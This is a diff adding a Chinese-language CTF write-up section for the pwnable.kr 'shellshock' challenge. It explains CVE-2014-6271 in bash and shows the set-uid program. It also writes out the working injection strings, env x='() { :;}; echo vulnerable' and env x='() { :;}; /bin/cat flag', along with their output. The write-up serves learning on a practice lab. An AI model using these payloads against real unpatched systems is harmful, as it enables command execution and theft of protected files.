@@ -447,3 +447,51 @@ Password OK
 Mommy, the operator priority always confuses me :(
 ```
 
+## 10 shellshock
+这是一个set-uid程序: 
+```c
+#include <stdio.h>
+
+int main(){
+
+        setresuid(getegid(), getegid(), getegid());
+
+        setresgid(getegid(), getegid(), getegid());
+
+        system("/home/shellshock/bash -c 'echo shock_me'");
+
+        return 0;
+
+}
+```
+这是一个别名为shellshock的漏洞, CVE-2014-6271 
+原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发
+```text
+export foo='{:;}; echo test'
+bash
+test
+```
+测试方法:
+```text
+shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+this is a test
+shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
+vulnerable
+```
+证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞 
+攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中
+```c
+setresuid(getegid(), getegid(), getegid());
+
+        setresgid(getegid(), getegid(), getegid());
+
+```
+确保了这一点. 
+所以可以这样攻击: 
+```text
+shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault
+shellshock@ubuntu:~$
+```
+
